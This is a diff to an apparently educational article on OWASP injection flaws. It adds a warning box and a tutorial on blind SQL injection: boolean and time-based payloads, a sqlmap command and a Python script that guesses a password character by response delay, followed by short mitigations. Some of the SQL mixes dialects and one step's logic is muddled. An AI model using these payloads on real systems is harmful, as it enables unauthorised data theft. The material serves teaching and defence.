@@ -133,6 +133,12 @@ The **Open Worldwide Application Security Project (OWASP)** is a gold-standard
 OWASP’s guidelines aren’t just rules—they’re a **mindset shift**. By embedding these practices early, teams build security into their DNA, reducing risks without slowing innovation.
 
 ---
+
+<div style="background-color: #ffebee; border-left: 4px solid #ff4444; padding: 12px; margin: 16px 0; border-radius: 4px;">
+  <p style="color: #ff4444; margin: 0; font-weight: bold;">⚠️ WARNING: EDUCATIONAL USE ONLY</p>
+  <p style="color: #b71c1c; margin: 8px 0 0 0;">The examples below demonstrate cybersecurity concepts for learning purposes. Never attempt these techniques on systems without explicit authorization.</p>
+</div>
+
 ### Injection Vulnerabilities: The Hacker’s Gateway
 Let's turn our attention to the motivating force behind putting these mechanisms in place: the vulnerabilities that attackers may exploit to undermine our security.
 **Injection flaws** rank among the _top attack vectors_ for breaching web applications. They let attackers inject malicious code into input fields, tricking servers into executing unintended commands—often with catastrophic results.
@@ -166,7 +172,8 @@ AND ItemName LIKE '%pillow%';
 3. Results are returned to the user.
 
 ##### Bypassing Security
-An attacker submits this search term :
+An attacker submits this search term  :
+
 ```SQL
 ' OR 1=1; --  
 ```
@@ -180,6 +187,109 @@ WHERE ItemName LIKE '%' OR 1=1; --%'
 AND ItemName LIKE '%tiger%'  
 AND ItemName LIKE '%pillow%';  
 ```
+
+##### What Happens?
+
+1. **`' OR 1=1;`** makes the first `LIKE` condition **always true** (`1=1` is universally true).
+2. **`--`** comments out the rest of the query.
+3. The database returns **all products**, not just matching items.
+
+#### Blind SQL Injection: When Attackers Can’t "See"
+In basic SQL injection attacks, hackers input malicious code and **directly observe** the results (e.g., dumped data or errors). But what if the app hides those results? Enter **blind SQL injection**—exploiting vulnerabilities _without_ direct feedback.
+###### **Content-Based Blind Injection**
+Attackers infer results based on changes in the app’s response (e.g., content, HTTP status codes)._
+###### Scenario
+A vulnerable e-commerce site hides database errors but returns a generic "No results found" page for invalid searches.
+
+**Step 1: Confirm Vulnerability**
+
+```SQL
+' AND 1=1 --  
+```
+
+- If the page shows results: The condition `1=1` (always true) is executed.
+- If the page shows "No results": The app is not vulnerable.
+
+**Step 2: Extract Admin Password (Character by Character)**
+
+```SQL
+' AND (SELECT SUBSTRING(password,1,1) FROM Users WHERE username='admin') = 'a' --  
+```
+
+- If the page shows results: The first character of `admin`’s password is **`a`**.
+- Repeat with `'b'`, `'c'`, etc., until the page behaves normally.
+
+Attackers use tools like **sqlmap** to brute-force all characters  :
+
+```BASH
+sqlmap -u "https://example.com/search?term=*" --technique=B --level=5 --risk=3  
+```
+
+###### **Timing-Based Blind SQL Injection**
+_Attackers infer results based on server response delays._
+
+###### Scenario
+A login form doesn’t return errors or data but is vulnerable to time delays.
+
+**Step 1: Confirm Vulnerability**
+
+```SQL
+' ; IF (1=1) WAITFOR DELAY '0:0:5' --  
+```
+
+- If the page takes **5 seconds** to respond: The database executes the delay.
+- If it responds instantly: Not vulnerable.
+
+**Step 2: Extract Database Version**
+
+```SQL
+' ; IF (SUBSTRING(@@version,1,1)='5') SLEEP(5) --  
+```
+
+- If the response is delayed: The database version starts with **`5`** (e.g., MySQL 5.x).
+
+**Step 3: Steal Data via Delays**
+
+```SQL
+' ; IF (SELECT COUNT(*) FROM Orders) > 1000 SLEEP(10); --  
+```
+
+- A **10-second delay** confirms the `Orders` table has over 1,000 entries.
+
+Attackers script delays to map out data :
+
+```Python
+import requests  
+import time  
+
+url = "https://example.com/login"  
+chars = "abcdef0123456789"  
+
+for char in chars:  
+    payload = f"' ; IF (SELECT SUBSTRING(password,1,1) FROM Users WHERE id=1)='{char}' SLEEP(5) -- "  
+    start = time.time()  
+    requests.post(url, data={"username": "admin", "password": payload})  
+    if time.time() - start > 5:  
+        print(f"First character: {char}")  
+        break  
+```
+
+###### **Comparison Table**
+
+|Technique|How It Works|Use Case|
+|---|---|---|
+|**Content-Based**|Analyze page content/behavior|Enumerating users, passwords|
+|**Timing-Based**|Measure response delays|Confirming database size, version|
+
+#### **Mitigation Strategies**
+
+- **Parameterized Queries** 
+- **Web Application Firewalls (WAF)**: Block suspicious patterns (e.g., `SLEEP`, `WAITFOR`).
+- **Error Handling**: Return generic messages (no database details).
+
+##### **Key Takeaway**
+
+Blind SQLi turns _silent clues_ into full-scale breaches. Even without direct feedback, attackers can steal data one character—or one second—at a time.
 
 
 
